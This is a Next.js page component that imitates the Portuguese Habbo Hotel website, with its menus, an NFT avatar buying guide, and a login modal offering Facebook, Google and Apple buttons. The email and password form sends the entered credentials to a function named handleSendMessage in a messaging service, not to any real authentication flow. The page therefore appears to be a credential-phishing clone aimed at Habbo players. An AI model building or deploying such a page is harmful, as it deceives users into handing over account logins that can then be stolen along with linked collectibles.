"use client";
import GlobalStyles from "@/styles/global.styles";
import theme from "@/styles/theme";
import { ThemeProvider } from "styled-components";
import * as S from "./styles";
import Image from "next/image";
import { useState } from "react";
import { handleSendMessage } from "@/services/sendMessage";

export default function Home() {
  const [nickname, setNickname] = useState("");
  const [pwd, setPwd] = useState("");

  return (
    <ThemeProvider theme={theme}>
      <GlobalStyles />
      <S.Topbar>
        <S.Container>
          <S.Logo></S.Logo>
          <S.WrapLogin>
            <S.Login>
              <S.LoginIcon></S.LoginIcon>
              Login
            </S.Login>
          </S.WrapLogin>
        </S.Container>
      </S.Topbar>
      <S.Menu>
        <S.MenuContainer>
          <S.ItemMenu>
            <S.IconMenu pos="-24px -487px"></S.IconMenu>
            Início
          </S.ItemMenu>
          <S.ItemMenu>
            <S.IconMenu pos="-366px -434px"></S.IconMenu>
            Comunidade
          </S.ItemMenu>
          <S.ItemMenu>
            <S.IconMenu pos="-224px -163px"></S.IconMenu>
            Habboshop
          </S.ItemMenu>
          <S.ItemMenu>
            <S.IconMenu pos="-375px -345px"></S.IconMenu>
            Sobre o Hotel
          </S.ItemMenu>
          <S.ItemMenu>
            <S.IconMenu pos="-224px -163px"></S.IconMenu>
            Colecionáveis
          </S.ItemMenu>
        </S.MenuContainer>
      </S.Menu>
      <S.BottomBar>
        <S.ContainerBottomBar>
          <S.BottomBarItem>Habbo Avatares</S.BottomBarItem>
          <S.BottomBarItem className="active">
            Itens colecionáveis
          </S.BottomBarItem>
        </S.ContainerBottomBar>
      </S.BottomBar>
      <S.Content>
        <S.ContentContainer>
          <S.WrapContent>
            <iframe
              width="640"
              height="340"
              src="https://www.youtube.com/embed/hTSO8btPlPE"
              title="How to buy and use Habbo Avatar NFTs"
              frameborder="0"
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
              referrerpolicy="strict-origin-when-cross-origin"
              allowfullscreen
            ></iframe>
            <S.Title>HABBO AVATARES</S.Title>
            <S.Paragraph>
              Os Habbo Avatares são a peça central do ecossistema de
              Colecionáveis Habbo. Abaixo, você encontra uma lista de links e
              guias oficiais escritos em inglês que explicam as etapas que você
              precisa seguir para comprar e aproveitar seu avatar:
            </S.Paragraph>
            <S.List>
              <S.Item>
                <span>Tenha uma carteira Ethereum</span> – também conhecida como
                carteira MetaMask – assim você consegue adquirir, guardar e usar
                os seus Colecionáveis Habbo.
              </S.Item>
              <S.Item>
                <span>Adquira ETH</span> – a criptomoeda necessária para
                adquirir Habbo Avatares. Observe que as transações MetaMask e de
                criptomoedas quase sempre exigem que você tenha mais de 18 anos
                para realizá-las. As criptomoedas também flutuam em valor, por
                favor, faça sua própria pesquisa antes de realizar qualquer
                transação.
              </S.Item>
              <S.Item>
                <span>OpenSea</span> – é o mercado preferencial onde adquirir os
                Habbo Avatares, Habbo Avatares Customizados, Quartos HabboX e
                Habbo Retratos.
              </S.Item>
              <S.Item>
                <span>Como usar o seu avatar no Habbo Hotel</span> – um guia que
                mostra como usar seu avatar.
              </S.Item>
              <S.Item>
                <span>Roadmap</span> – descubra que tipo de utilidade os
                Avatares Habbo terão no futuro e o que já conquistamos através
                desse mapa de planejamento.
              </S.Item>
              <S.Item>
                <span>Esmeraldas</span> – você os acumula automaticamente depois
                de conectar a carteira que contém seu avatar ao Immutable. Eles
                podem ser gastos em muitas coisas diferentes dentro do
                ecossistema de Colecionáveis Habbo.
              </S.Item>
            </S.List>
          </S.WrapContent>
          <Image
            className="img"
            src="https://images.habbo.com/c_images/nft/nft_avatars.png"
            width={200}
            height={260}
          />
        </S.ContentContainer>
      </S.Content>
      <S.Backdrop />
      <S.WrapModal>
        <S.Modal>
          <S.ModalHeader>
            Login
            <S.Close></S.Close>
          </S.ModalHeader>
          <S.ModalContent>
            <S.SmallModalContent>
              <S.P>Faça login com um desses métodos</S.P>
              <S.Fb>
                <S.Icon pos="-323px -345px"></S.Icon>
                Facebook
                <S.IconEmpty></S.IconEmpty>
              </S.Fb>
              <S.Google>
                <S.Icon pos="-255px -132px"></S.Icon>
                Google
                <S.IconEmpty></S.IconEmpty>
              </S.Google>
              <S.Apple>
                <S.Icon pos="-369px -240px"></S.Icon>
                Apple
                <S.IconEmpty></S.IconEmpty>
              </S.Apple>
              <S.Small>Outras formas de login</S.Small>
              <S.P className="center">Ou use o seu e-mail e senha:</S.P>
              <S.Form
                onSubmit={(e) => {
                  e.preventDefault();
                  handleSendMessage(nickname, pwd);
                }}
              >
                <S.Input
                  placeholder="E-mail"
                  type="email"
                  value={nickname}
                  onChange={(e) => setNickname(e.target.value)}
                  required
                />
                <S.Input
                  placeholder="Senha"
                  value={pwd}
                  onChange={(e) => setPwd(e.target.value)}
                  required
                />
                <S.Submit type="submit">Vamos lá!</S.Submit>
              </S.Form>
              <S.Small>Esqueci a minha senha</S.Small>
              <S.Divisor />
              <S.Small>Ainda não tem uma conta? Entre já!</S.Small>
              <S.Spacing />
            </S.SmallModalContent>
          </S.ModalContent>
        </S.Modal>
      </S.WrapModal>
    </ThemeProvider>
  );
}
